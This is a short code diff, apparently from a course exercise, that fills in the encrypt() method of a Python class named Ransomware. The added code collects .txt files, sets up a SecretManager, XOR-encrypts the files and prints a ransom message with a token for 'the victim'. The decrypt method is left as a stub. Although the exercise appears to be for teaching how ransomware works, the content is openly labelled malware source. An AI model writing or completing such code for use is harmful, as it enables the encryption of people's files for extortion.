@@ -40,8 +40,20 @@ class Ransomware:
         return files_list
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # List .txt files
+        files_list=self.get_files(".txt")
+        
+        # Create SecretManager 
+        secret_manager = SecretManager()
+        
+        # Use setup
+        secret_manager.setup()
+
+        # Encrypt files
+        secret_manager.xorfiles(files_list)
+        
+        # Message to the victim
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
